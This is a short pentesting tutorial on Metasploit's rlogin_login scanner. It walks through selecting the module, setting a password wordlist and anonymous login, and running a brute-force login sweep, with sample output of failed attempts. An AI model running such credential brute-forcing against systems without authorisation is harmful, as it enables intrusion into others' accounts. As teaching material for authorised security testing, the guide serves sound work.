# Metasploit
## 1: Start metasploit console
```bash
msfconsole
```

## 2: Find and select a module
In this example, I chose to use an auxiliary (rlogin)
```bash
search auxiliary/scanner
```
Her kan man se et modul helt i bunden, som har følgende beskrivelse
```console
Matching Modules
================

   #    Name                                                     Disclosure Date  Rank    Check  Description
   -    ----                                                     ---------------  ----    -----  -----------
   0    auxiliary/scanner/http/netalertx_file_read               2025-01-30       normal  No     NetAlertX File Read Vulnerability
   ...  ...                                                      ...              ...     ...    ...
   745  auxiliary/scanner/rservices/rlogin_login                                  normal  No     rlogin Authentication Scanner
   746  auxiliary/scanner/rservices/rsh_login                                     normal  No     rsh Authentication Scanner

Interact with a module by name or index. For example info 746, use 746 or use auxiliary/scanner/rservices/rsh_login

msf > use auxiliary/scanner/rservices/rlogin_login
msf auxiliary(scanner/rservices/rlogin_login) >
```
You select the module with this command. If successful, you will get a confirmation and msf > will change name to the selected module
```bash
use auxiliary/scanner/rservices/rlogin_login
```
```console
msf auxiliary(scanner/rservices/rlogin_login) >
```

## 3: Configure settings
Before we can attack target, we must first configure the settings for the module by typing either "Options" or "Show Options"
```bash
show options
```
Here you can choose which wordlists you want to use, as this module works on wordlists as well as changing module settings that for example makes each username used with each password instead of first username only used with the first password and much else. Configure to your needs.
```console
Module options (auxiliary/scanner/rservices/rlogin_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   ...
```
You change the different Options by typing "set" or "unset" to return to default. Remember to set correctly, for example if you need to set a wordlist, you should use a path to the wordlist file. If something should be turned on or off you write set (option) true/false. 
```console
msf auxiliary(scanner/rservices/rlogin_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
```
```console
msf auxiliary(scanner/rservices/rlogin_login) > set ANONYMOUS_LOGIN true
ANONYMOUS_LOGIN => true
```

## 4: Run the module
After all options are set as desired according to your needs, you can now start the scan with
```bash
run
```
or if target has not been set
```bash
run (target)
```
In this case we get this output
```console
[*] Starting rlogin sweep
[-] rlogin - Attempting: 'admin':'admin' from 'root'
[-] Prompt: Check Point FireWall-1 authenticated RLogin server running on bulldog
[-] Result: ***** Access denied - wrong user name or password
[-] rlogin - Attempting: 'admin':'password' from 'daemon'
[-] Unable to connect: The destination is invalid:
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/rservices/rlogin_login) >
```
It can be seen in this example that fortunately we do not get through with the "default_username" and "default_password" wordlists we used. Thus you can use Metasploit to pentest systems. 


